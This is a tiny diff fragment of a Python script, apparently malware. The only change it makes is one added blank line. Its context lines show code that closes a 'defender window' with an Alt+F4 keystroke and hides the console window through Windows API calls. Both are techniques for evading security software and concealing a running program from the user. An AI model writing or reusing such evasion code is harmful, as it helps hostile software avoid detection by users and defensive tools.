@@ -39,6 +39,7 @@ pyautogui.hotkey('alt', 'f4')  # Close the defender window
 
 
 
+
 # Step 1: Hide terminal window (Windows only)
 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
